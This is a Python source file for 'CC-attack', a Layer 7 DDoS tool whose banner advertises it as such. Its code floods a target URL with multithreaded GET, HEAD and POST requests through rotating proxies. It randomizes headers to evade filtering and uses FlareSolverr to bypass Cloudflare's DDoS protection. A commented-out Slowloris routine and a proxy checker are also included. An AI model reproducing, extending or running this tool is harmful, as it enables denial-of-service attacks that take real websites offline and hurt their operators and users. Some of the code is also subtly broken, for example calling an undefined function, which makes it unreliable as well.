#!/usr/bin/python3
#Coded by L330n123
#########################################
#         Just a little change          #
#                           -- L330n123 #
#########################################
import requests
import socket
import socks
import time
import random
import threading
import sys
import ssl
import datetime
import os
from collections import defaultdict
import json

# DEBUG_MODE = False  # 关闭调试输出
# SAMPLE_RATE = 100   # 正常采样率
DEBUG_MODE = True   # 开启调试输出
DEBUG_SAMPLE_RATE = 1000  # 调试信息每1000次请求打印一次
# SAMPLE_RATE = 10    # 更频繁的统计采样

# FlareSolverr配置（添加到全局统计变量后）
FLARESOLVERR_URL = "http://localhost:8191/v1"
USE_FLARESOLVERR = False
flaresolverr_session = None
flaresolverr_cookies = {}
flaresolverr_headers = {}
flaresolverr_lock = threading.Lock()
session_refresh_interval = 300  # 5分钟刷新一次session
last_session_time = 0


# 全局统计变量
stats_lock = threading.Lock()
request_count = 0
status_codes = defaultdict(int)
error_count = 0
success_count = 0
start_time = time.time()

# 统计配置
REPORT_INTERVAL = 10000  # 每10000次请求打印一次统计
SAMPLE_RATE = 100       # 每100个请求采样1个进行详细分析



print ('''
	   /////    /////    /////////////
	  CCCCC/   CCCCC/   | CC-attack |/
	 CC/      CC/       |-----------|/ 
	 CC/      CC/       |  Layer 7  |/ 
	 CC/////  CC/////   | ddos tool |/ 
	  CCCCC/   CCCCC/   |___________|/
>--------------------------------------------->
Version 3.7.1 (2022/3/24)
                              C0d3d by L330n123
┌─────────────────────────────────────────────┐
│        Tos: Don't attack .gov website       │
├─────────────────────────────────────────────┤
│                 New stuff:                  │
│          [+] Added Http Proxy Support       │
│          [+] Optimization                   │
│          [+] Changed Varible Name           │
├─────────────────────────────────────────────┤
│ Link: https://github.com/Leeon123/CC-attack │
└─────────────────────────────────────────────┘''')

acceptall = [
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]

referers = [
	"https://www.google.com/search?q=",
	"https://check-host.net/",
	"https://www.facebook.com/",
	"https://www.youtube.com/",
	"https://www.fbi.com/",
	"https://www.bing.com/search?q=",
	"https://r.search.yahoo.com/",
	"https://www.cia.gov/index.html",
	"https://vk.com/profile.php?redirect=",
	"https://www.usatoday.com/search/results?q=",
	"https://help.baidu.com/searchResult?keywords=",
	"https://steamcommunity.com/market/search?q=",
	"https://www.ted.com/search?q=",
	"https://play.google.com/store/search?q=",
	"https://www.qwant.com/search?q=",
	"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
	"https://www.google.ad/search?q=",
	"https://www.google.ae/search?q=",
	"https://www.google.com.af/search?q=",
	"https://www.google.com.ag/search?q=",
	"https://www.google.com.ai/search?q=",
	"https://www.google.al/search?q=",
	"https://www.google.am/search?q=",
	"https://www.google.co.ao/search?q=",
]

######### Default value ########
mode = "cc"
url = ""
proxy_ver = "5"
brute = False
out_file = "proxy.txt"
thread_num = 800
data = ""
cookies = ""
full_target_url = ""
###############################
strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
###################################################
Intn = random.randint
Choice = random.choice
###################################################
def build_threads(mode,thread_num,event,proxy_type):
	if mode == "post":
		for _ in range(thread_num):
			th = threading.Thread(target = post,args=(event,proxy_type,))
			th.daemon = True
			th.start()
	elif mode == "cc":
		for _ in range(thread_num):
			th = threading.Thread(target = cc,args=(event,proxy_type,))
			th.daemon = True
			th.start()
	elif mode == "head":
		for _ in range(thread_num):
			th = threading.Thread(target = head,args=(event,proxy_type,))
			th.daemon = True
			th.start()

def is_cloudflare_blocked(response_data):
    """检测是否被Cloudflare拦截"""
    try:
        if response_data:
            response_str = response_data.decode('utf-8', errors='ignore').lower()
            # 检测Cloudflare特征
            cf_indicators = [
                'cloudflare',
                'cf-ray',
                'checking your browser',
                'ddos protection',
                'security check',
                'ray id'
            ]
            return any(indicator in response_str for indicator in cf_indicators)
    except:
        pass
    return False

def get_cf_cookies_headers():
    """获取Cloudflare绕过后的cookies和headers"""
    if not USE_FLARESOLVERR:
        return "", ""
    
    cookies_str = ""
    headers_str = ""
    
    # 构建Cookie字符串
    if flaresolverr_cookies:
        cookie_pairs = []
        for cookie in flaresolverr_cookies:
            cookie_pairs.append(f"{cookie['name']}={cookie['value']}")
        cookies_str = "Cookie: " + "; ".join(cookie_pairs) + "\r\n"
    
    # 添加重要的CF headers
    if flaresolverr_headers:
        for key, value in flaresolverr_headers.items():
            if key.lower() in ['user-agent', 'accept', 'accept-language']:
                headers_str += f"{key}: {value}\r\n"
    
    return cookies_str, headers_str


def init_flaresolverr_session():
    """初始化FlareSolverr会话"""
    global flaresolverr_session, flaresolverr_cookies, flaresolverr_headers, last_session_time
    
    try:
        # 创建新会话
        payload = {
            "cmd": "sessions.create",
            "session": f"cc_attack_{int(time.time())}"
        }
        
        response = requests.post(FLARESOLVERR_URL, json=payload, timeout=30)
        if response.status_code == 200:
            result = response.json()
            if result.get('status') == 'ok':
                flaresolverr_session = result['session']
                print(f"[FlareSolverr] Session created: {flaresolverr_session}")
                return True
    except Exception as e:
        print(f"[FlareSolverr] Failed to create session: {e}")
    
    return False

def solve_cloudflare(url):
    """使用FlareSolverr解决Cloudflare挑战"""
    global flaresolverr_session, flaresolverr_cookies, flaresolverr_headers, last_session_time
    
    with flaresolverr_lock:
        current_time = time.time()
        
        # 检查是否需要刷新session
        if current_time - last_session_time > session_refresh_interval:
            print("[FlareSolverr] Refreshing session...")
            init_flaresolverr_session()
            last_session_time = current_time
        
        try:
            payload = {
                "cmd": "request.get",
                "url": url,
                "session": flaresolverr_session,
                "maxTimeout": 60000
            }
            
            response = requests.post(FLARESOLVERR_URL, json=payload, timeout=65)
            if response.status_code == 200:
                result = response.json()
                if result.get('status') == 'ok':
                    solution = result.get('solution', {})
                    flaresolverr_cookies = solution.get('cookies', {})
                    flaresolverr_headers = solution.get('headers', {})
                    return True
        except Exception as e:
            print(f"[FlareSolverr] Error solving challenge: {e}")
    
    return False

def get_flaresolverr_session():
    """获取FlareSolverr会话信息"""
    session_dict = {}
    for cookie in flaresolverr_cookies:
        session_dict[cookie['name']] = cookie['value']
    
    headers = flaresolverr_headers.copy()
    return session_dict, headers


def update_stats_simple(status_code=None, is_error=False, error_type=None, debug_info=None):
    """简化的统计更新 - 性能优化版"""
    global request_count, status_codes, error_count, success_count
    
    with stats_lock:
        request_count += 1
        
        # 每个请求都进行基本统计，但只采样详细分析
        if request_count % SAMPLE_RATE == 0:
            if is_error:
                error_count += 1
                error_key = f"ERROR_{error_type}" if error_type else "ERROR_UNKNOWN"
                status_codes[error_key] += 1
                
                # 只在调试模式且满足调试采样率时才打印
                if DEBUG_MODE and request_count % DEBUG_SAMPLE_RATE == 0 and debug_info:
                    print(f"[DEBUG] 错误详情 - 类型: {error_type}, 信息: {debug_info}")
                    
            elif status_code:
                success_count += 1
                status_codes[status_code] += 1
            else:
                # UNKNOWN状态 - 只记录，不频繁打印
                error_count += 1
                unknown_key = f"UNKNOWN_{error_type}" if error_type else "UNKNOWN_NO_RESPONSE"
                status_codes[unknown_key] += 1
                
                # 只在调试模式且满足调试采样率时才打印
                if DEBUG_MODE and request_count % DEBUG_SAMPLE_RATE == 0:
                    print(f"[DEBUG] UNKNOWN状态 - 原因: {error_type or 'NO_RESPONSE'}, 详情: {debug_info or 'N/A'}")
        
        # 打印统计
        if request_count % REPORT_INTERVAL == 0:
            print_stats()


def print_stats():
    """打印统计信息 - 增强版"""
    elapsed_time = time.time() - start_time
    rps = request_count / elapsed_time if elapsed_time > 0 else 0
    
    print(f"\n{'='*60}")
    print(f"执行统计报告 - 总请求数: {request_count}")
    print(f"运行时间: {elapsed_time:.2f}秒 | 平均RPS: {rps:.2f}")
    print(f"采样统计 (采样率: 1/{SAMPLE_RATE}):")
    print(f"  采样成功: {success_count} | 采样失败: {error_count}")
    print(f"{'='*60}")
    
    # 按状态码分组显示（基于采样数据）
    if status_codes:
        print("状态码分布 (采样数据):")
        
        # 分类显示
        success_codes = {}
        error_codes = {}
        unknown_codes = {}
        
        for code, count in status_codes.items():
            if isinstance(code, int) or (isinstance(code, str) and code.isdigit()):
                success_codes[code] = count
            elif code.startswith('ERROR_'):
                error_codes[code] = count
            elif code.startswith('UNKNOWN_'):
                unknown_codes[code] = count
            else:
                error_codes[code] = count
        
        # 显示成功响应
        if success_codes:
            print("  ✅ 成功响应:")
            for code, count in sorted(success_codes.items(), key=lambda x: x[1], reverse=True):
                percentage = (count / sum(status_codes.values())) * 100
                estimated_total = count * SAMPLE_RATE
                print(f"    HTTP {code}: {count} 次采样 ({percentage:.1f}%) [估算: ~{estimated_total}]")
        
        # 显示错误响应
        if error_codes:
            print("  ❌ 错误响应:")
            for code, count in sorted(error_codes.items(), key=lambda x: x[1], reverse=True):
                percentage = (count / sum(status_codes.values())) * 100
                estimated_total = count * SAMPLE_RATE
                print(f"    {code}: {count} 次采样 ({percentage:.1f}%) [估算: ~{estimated_total}]")
        
        # 显示未知响应
        if unknown_codes:
            print("  ❓ 未知响应:")
            for code, count in sorted(unknown_codes.items(), key=lambda x: x[1], reverse=True):
                percentage = (count / sum(status_codes.values())) * 100
                estimated_total = count * SAMPLE_RATE
                print(f"    {code}: {count} 次采样 ({percentage:.1f}%) [估算: ~{estimated_total}]")
    
    print(f"{'='*60}\n")

def parse_response(response_data):
    """解析HTTP响应获取状态码 - 性能优化版"""
    try:
        if not response_data:
            return None
            
        response_str = response_data.decode('utf-8', errors='ignore')
        lines = response_str.split('\n', 1)  # 只分割第一行，提高性能
        
        if not lines:
            if DEBUG_MODE:
                print(f"[DEBUG] 响应解析失败: 没有行数据")
            return None
            
        first_line = lines[0].strip()
        if 'HTTP/' not in first_line:
            if DEBUG_MODE:
                print(f"[DEBUG] 响应解析失败: 首行不包含HTTP - '{first_line[:50]}'")
            return None
            
        parts = first_line.split(' ', 2)  # 只分割前3部分，提高性能
        if len(parts) < 2:
            if DEBUG_MODE:
                print(f"[DEBUG] 响应解析失败: HTTP行格式错误 - '{first_line}'")
            return None
            
        try:
            status_code = int(parts[1])
            return status_code
        except ValueError:
            if DEBUG_MODE:
                print(f"[DEBUG] 响应解析失败: 状态码不是数字 - '{parts[1]}'")
            return None
            
    except Exception as e:
        if DEBUG_MODE:
            print(f"[DEBUG] 响应解析失败: 未知错误 - {str(e)}")
        return None


def getuseragent():
	platform = Choice(['Macintosh', 'Windows', 'X11'])
	if platform == 'Macintosh':
		os  = Choice(['68K', 'PPC', 'Intel Mac OS X'])
	elif platform == 'Windows':
		os  = Choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
	elif platform == 'X11':
		os  = Choice(['Linux i686', 'Linux x86_64'])
	browser = Choice(['chrome', 'firefox', 'ie'])
	if browser == 'chrome':
		webkit = str(Intn(500, 599))
		version = str(Intn(0, 99)) + '.0' + str(Intn(0, 9999)) + '.' + str(Intn(0, 999))
		return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
	elif browser == 'firefox':
		currentYear = datetime.date.today().year
		year = str(Intn(2020, currentYear))
		month = Intn(1, 12)
		if month < 10:
			month = '0' + str(month)
		else:
			month = str(month)
		day = Intn(1, 30)
		if day < 10:
			day = '0' + str(day)
		else:
			day = str(day)
		gecko = year + month + day
		version = str(Intn(1, 72)) + '.0'
		return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
	elif browser == 'ie':
		version = str(Intn(1, 99)) + '.0'
		engine = str(Intn(1, 99)) + '.0'
		option = Choice([True, False])
		if option == True:
			token = Choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
		else:
			token = ''
		return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'

def randomurl():
	return str(Intn(0,271400281257))#less random, more performance

def GenReqHeader(method):
    global data, target, path
    header = ""
    
    # 获取CF绕过信息 (返回的是字符串)
    cf_cookies_str, cf_headers_str = get_cf_cookies_headers()
    
    if method == "get" or method == "head":
        connection = "Connection: Keep-Alive\r\n"
        
        # 处理 Cookies
        if cf_cookies_str:
            connection += cf_cookies_str # 已经包含了 "Cookie: ...\r\n"
        elif cookies:
            connection += f"Cookie: {cookies}\r\n"
            
        # 处理其他 Headers
        if cf_headers_str:
            # 如果 FlareSolverr 提供了 headers, 直接使用
            header = cf_headers_str + connection + "\r\n"
        else:
            # 否则, 手动生成
            referer = f"Referer: {Choice(referers)}{target}{path}\r\n"
            useragent = f"User-Agent: {getuseragent()}\r\n"
            accept = Choice(acceptall)
            header = referer + useragent + accept + connection + "\r\n"
        
        return header

    elif method == "post":
        post_host = f"POST {path} HTTP/1.1\r\nHost: {target}\r\n"
        
        # 准备POST数据
        if data:
            post_data = data
        else:
            # 生成随机POST数据
            post_data = ''.join(random.choices(strings, k=random.randint(10, 100)))
        
        # 准备headers
        content = "Content-Type: application/x-www-form-urlencoded\r\n"
        content += "X-Requested-With: XMLHttpRequest\r\n"
        refer = f"Referer: {protocol}://{target}{path}\r\n"
        length = f"Content-Length: {len(post_data)}\r\n"
        connection = "Connection: Keep-Alive\r\n"
        
        # 处理Cookies
        cookie_header = ""
        if cf_cookies_str:
            cookie_header = cf_cookies_str
        elif cookies:
            cookie_header = f"Cookie: {cookies}\r\n"

        # 组合所有部分
        if cf_headers_str:
            user_agent = ""  # CF headers中可能已包含
            accept = ""      # CF headers中可能已包含
            # 从cf_headers_str中提取或使用默认值
            if "User-Agent:" not in cf_headers_str:
                user_agent = f"User-Agent: {getuseragent()}\r\n"
            if "Accept:" not in cf_headers_str:
                accept = Choice(acceptall)
        else:
            user_agent = f"User-Agent: {getuseragent()}\r\n"
            accept = Choice(acceptall)
        
        # 构建完整请求
        header = (post_host + accept + refer + content + user_agent + 
                 length + connection + cookie_header + "\r\n" + 
                 post_data + "\r\n\r\n")
        
        return header

def handle_response_with_cf_detection(s, header_gen_func, header_type="get"):
    """处理响应并检测Cloudflare拦截"""
    global USE_FLARESOLVERR, request_count, success_count, error_count
    
    # 先更新请求计数
    with stats_lock:
        request_count += 1
        should_sample = request_count % SAMPLE_RATE == 0
    
    try:
        s.settimeout(1)
        response = s.recv(1024)
        status_code = parse_response(response)
        
        # 检测Cloudflare拦截
        if is_cloudflare_blocked(response) and not USE_FLARESOLVERR:
            print(f"[CF检测] 发现Cloudflare拦截，正在启用绕过...")
            USE_FLARESOLVERR = True
            full_url = f"{protocol}://{target}:{port}{path}"
            if solve_cloudflare(full_url):
                print("[CF绕过] Cloudflare挑战已解决")
                return header_gen_func(header_type)
            else:
                print("[CF绕过] 解决Cloudflare挑战失败")
        
        # 只在采样时更新详细统计
        if should_sample:
            with stats_lock:
                if status_code:
                    success_count += 1
                    status_codes[status_code] += 1
                else:
                    error_count += 1
                    status_codes['ERROR'] += 1
                    
    except Exception as e:
        # 只在采样时更新错误统计
        if should_sample:
            with stats_lock:
                error_count += 1
                status_codes['ERROR'] += 1
    
    # 检查是否需要打印统计
    with stats_lock:
        if request_count % REPORT_INTERVAL == 0:
            print_stats()
    return None

def ParseUrl(original_url):
	global target
	global path
	global port
	global protocol
	global full_target_url
	original_url = original_url.strip()
	url = ""
	path = "/"#default value
	port = 80 #default value
	protocol = "http"
	#http(s)://www.example.com:1337/xxx
	if original_url[:7] == "http://":
		url = original_url[7:]
	elif original_url[:8] == "https://":
		url = original_url[8:]
		protocol = "https"
	else:
		print("> That looks like not a correct url.")
		exit()
	#http(s)://www.example.com:1337/xxx ==> www.example.com:1337/xxx
	#print(url) #for debug
	tmp = url.split("/")
	website = tmp[0]#www.example.com:1337/xxx ==> www.example.com:1337
	check = website.split(":")
	if len(check) != 1:#detect the port
		port = int(check[1])
	else:
		if protocol == "https":
			port = 443
	target = check[0]
	if len(tmp) > 1:
		path = url.replace(website,"",1)#get the path www.example.com/xxx ==> /xxx
	full_target_url = original_url  # 保存完整URL	

def InputOption(question,options,default):
	ans = ""
	while ans == "":
		ans = str(input(question)).strip().lower()
		if ans == "":
			ans = default
		elif ans not in options:
			print("> Please enter the correct option")
			ans = ""
			continue
	return ans

def cc(event, proxy_type):
    global USE_FLARESOLVERR, url, request_count
    header = GenReqHeader("get")
    proxy = Choice(proxies).strip().split(":")
    add = "?"
    if "?" in path:
        add = "&"
    event.wait()
    
    while True:
        # 1. 把 socket 创建和连接的逻辑移到循环内部
        s = None  # 确保 s 被定义
        try:
            s = socks.socksocket()
            if proxy_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            elif proxy_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            elif proxy_type == 0:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            
            if brute:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            
            s.settimeout(10)
            s.connect((str(target), int(port)))
            
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)

            # 2. 发送请求并立即处理响应，然后关闭连接
            get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
            # 3. 确保使用 Connection: close 来避免混淆
            request = get_host + header.replace("Connection: Keep-Alive", "Connection: close") 
            s.send(str.encode(request))
            
            # 使用简化的统计，因为我们现在每次只发一个请求
            # 这里可以简化，直接接收并解析，因为我们知道连接会关闭
            response_data = s.recv(4096) # 可以读多一点数据
            status_code = parse_response(response_data)
            
            # 使用你现有的统计函数
            if status_code:
                update_stats_simple(status_code=status_code)
            else:
                debug_info = response_data[:100].decode('utf-8', errors='ignore') if DEBUG_MODE else None
                update_stats_simple(is_error=True, error_type="PARSE_FAILED", debug_info=debug_info)

            # 4. 手动关闭 socket
            s.close()
            
        except Exception as e:
            if s:
                s.close()
            # 当连接失败时，更换代理并重试
            proxy = Choice(proxies).strip().split(":")
            debug_info = str(e) if DEBUG_MODE else None
            update_stats_simple(is_error=True, error_type="CONNECTION_ERROR", debug_info=debug_info)


def head(event,proxy_type):
	global USE_FLARESOLVERR, url, request_count  # ⚠️ 添加这行
	header = GenReqHeader("head")
	proxy = Choice(proxies).strip().split(":")
	add = "?"
	if "?" in path:
		add = "&"
	event.wait()
	while True:
		try:
			s = socks.socksocket()
			if proxy_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if proxy_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			if proxy_type == 0:
				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
			if brute:
				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.connect((str(target), int(port)))
			if protocol == "https":
				ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
				s = ctx.wrap_socket(s,server_hostname=target)
			try:
				for _ in range(100):
					head_host = "HEAD " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
					request = head_host + header
					sent = s.send(str.encode(request))
					if not sent:
						proxy = Choice(proxies).strip().split(":")
						update_stats_sample(is_error=True)
						break
					new_header = handle_response_with_cf_detection(s, GenReqHeader, "head")
					if new_header:
                        			header = new_header
				s.close()
			except:
				s.close()
		except:
			s.close()


def post(event, proxy_type):
    global USE_FLARESOLVERR, url, request_count
    request = GenReqHeader("post")
    proxy = Choice(proxies).strip().split(":")
    event.wait()
    
    error_count = 0
    max_errors = 50
    
    while True:
        try:
            s = socks.socksocket()
            if proxy_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            elif proxy_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            elif proxy_type == 0:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            
            if brute:
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            
            s.settimeout(10)
            s.connect((str(target), int(port)))
            
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            
            error_count = 0
            
            try:
                for _ in range(100):
                    sent = s.send(str.encode(request))
                    if not sent:
                        proxy = Choice(proxies).strip().split(":")
                        # 减少debug_info的字符串构建开销
                        debug_info = f"proxy:{proxy[0]}:{proxy[1]}" if DEBUG_MODE else None
                        update_stats_simple(is_error=True, error_type="SEND_FAILED", debug_info=debug_info)
                        break
                    
                    try:
                        s.settimeout(2)
                        response = s.recv(1024)
                        
                        if not response:
                            update_stats_simple(status_code=None, error_type="EMPTY_RESPONSE", 
                                              debug_info="empty" if DEBUG_MODE else None)
                            continue
                            
                        status_code = parse_response(response)
                        
                        if status_code:
                            update_stats_simple(status_code=status_code)
                            
                            if is_cloudflare_blocked(response) and not USE_FLARESOLVERR:
                                print(f"[CF检测] 发现Cloudflare拦截，正在启用绕过...")
                                USE_FLARESOLVERR = True
                                full_url = f"{protocol}://{target}:{port}{path}"
                                if solve_cloudflare(full_url):
                                    print("[CF绕过] Cloudflare挑战已解决")
                                    request = GenReqHeader("post")
                        else:
                            # 只在调试模式时构建详细信息
                            debug_info = None
                            if DEBUG_MODE:
                                response_preview = response[:50].decode('utf-8', errors='ignore')
                                debug_info = f"parse_fail:{response_preview}"
                            update_stats_simple(status_code=None, error_type="PARSE_FAILED", debug_info=debug_info)
                            
                    except socket.timeout:
                        update_stats_simple(is_error=True, error_type="RECV_TIMEOUT", debug_info=None)
                    except socket.error as e:
                        debug_info = str(e) if DEBUG_MODE else None
                        update_stats_simple(is_error=True, error_type="SOCKET_ERROR", debug_info=debug_info)
                    except Exception as recv_error:
                        debug_info = str(recv_error) if DEBUG_MODE else None
                        update_stats_simple(is_error=True, error_type="RECV_EXCEPTION", debug_info=debug_info)
                        
                s.close()
            except Exception as inner_error:
                s.close()
                debug_info = str(inner_error) if DEBUG_MODE else None
                update_stats_simple(is_error=True, error_type="INNER_LOOP", debug_info=debug_info)
                
        except socket.gaierror as e:
            s.close()
            proxy = Choice(proxies).strip().split(":")
            error_count += 1
            debug_info = str(e) if DEBUG_MODE else None
            update_stats_simple(is_error=True, error_type="DNS_ERROR", debug_info=debug_info)
        except socket.timeout:
            s.close()
            proxy = Choice(proxies).strip().split(":")
            error_count += 1
            update_stats_simple(is_error=True, error_type="CONNECT_TIMEOUT", debug_info=None)
        except ConnectionRefusedError:
            s.close()
            proxy = Choice(proxies).strip().split(":")
            error_count += 1
            debug_info = f"proxy:{proxy[0]}:{proxy[1]}" if DEBUG_MODE else None
            update_stats_simple(is_error=True, error_type="CONNECTION_REFUSED", debug_info=debug_info)
        except Exception as outer_error:
            s.close()
            proxy = Choice(proxies).strip().split(":")
            error_count += 1
            debug_info = str(outer_error) if DEBUG_MODE else None
            update_stats_simple(is_error=True, error_type="CONNECT_ERROR", debug_info=debug_info)
            
            if error_count % max_errors == 0:
                print(f"[WARNING] POST线程连续失败 {error_count} 次，当前代理: {proxy[0]}:{proxy[1]}")

''' idk why it's not working, so i temporarily removed it
def slow_atk_conn(proxy_type,rlock):
	global socket_list
	proxy = Choice(proxies).strip().split(":")
	while 1:
		try:
			s = socks.socksocket()
			if proxy_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if proxy_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
if proxy_type == 0:
				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
			s.settimeout(3)
			s.connect((str(target), int(port)))
			if str(port) == '443':
				ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
				s = ctx.wrap_socket(s,server_hostname=target)
			s.send("GET /?{} HTTP/1.1\r\n".format(Intn(0, 2000)).encode("utf-8"))# Slowloris format header
			s.send("User-Agent: {}\r\n".format(getuseragent()).encode("utf-8"))
			s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
			if cookies != "":
				s.send(("Cookies: "+str(cookies)+"\r\n").encode("utf-8"))
			s.send(("Connection:keep-alive").encode("utf-8"))
			rlock.acquire()
			socket_list.append(s)
			rlock.release()
			return
		except:
			#print("Connection failed")
			s.close()
			proxy = Choice(proxies).strip().split(":")#Only change proxy when error, increase the performance

socket_list=[]
def slow(conn,proxy_type):
	global socket_list
	rlock = threading.Lock
	for _ in range(conn):
		threading.Thread(target=slow_atk_conn,args=(proxy_type,rlock,),daemon=True).start()
	while True:
		sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
		sys.stdout.flush()
		if len(socket_list) != 0 :
			for s in list(socket_list):
				try:
					s.send("X-a: {}\r\n".format(Intn(1, 5000)).encode("utf-8"))
					sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
					sys.stdout.flush()
				except:
					s.close()
					socket_list.remove(s)
					sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
					sys.stdout.flush()
			proxy = Choice(proxies).strip().split(":")
			for _ in range(conn - len(socket_list)):
				threading.Thread(target=slow_atk_conn,args=(proxy_type,rlock,),daemon=True).start()
		else:
			time.sleep(0.1)
'''		
		
nums = 0
def checking(lines,proxy_type,ms,rlock,):#Proxy checker coded by Leeon123
	global nums
	global proxies
	proxy = lines.strip().split(":")
	if len(proxy) != 2:
		rlock.acquire()
		proxies.remove(lines)
		rlock.release()
		return
	err = 0
	while True:
		if err >= 3:
			rlock.acquire()
			proxies.remove(lines)
			rlock.release()
			break
		try:
			s = socks.socksocket()
			if proxy_type == 4:
				s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
			if proxy_type == 5:
				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
			if proxy_type == 0:
				s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
			s.settimeout(ms)
			s.connect(("1.1.1.1", 80))
			'''
			if protocol == "https":
				ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
				s = ctx.wrap_socket(s,server_hostname=target)'''
			sent = s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
			if not sent:
				err += 1
			s.close()
			break
		except:
			err +=1
	nums += 1

def check_socks(ms):#Coded by Leeon123
	global nums
	thread_list=[]
	rlock = threading.RLock()
	for lines in list(proxies):
		if proxy_ver == "5":
			th = threading.Thread(target=checking,args=(lines,5,ms,rlock,))
			th.start()
		if proxy_ver == "4":
			th = threading.Thread(target=checking,args=(lines,4,ms,rlock,))
			th.start()
		if proxy_ver == "http":
			th = threading.Thread(target=checking,args=(lines,0,ms,rlock,))
			th.start()
		thread_list.append(th)
		time.sleep(0.01)
		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
		sys.stdout.flush()
	for th in list(thread_list):
		th.join()
		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
		sys.stdout.flush()
	print("\r\n> Checked all proxies, Total Worked:"+str(len(proxies)))
	#ans = input("> Do u want to save them in a file? (y/n, default=y)")
	#if ans == "y" or ans == "":
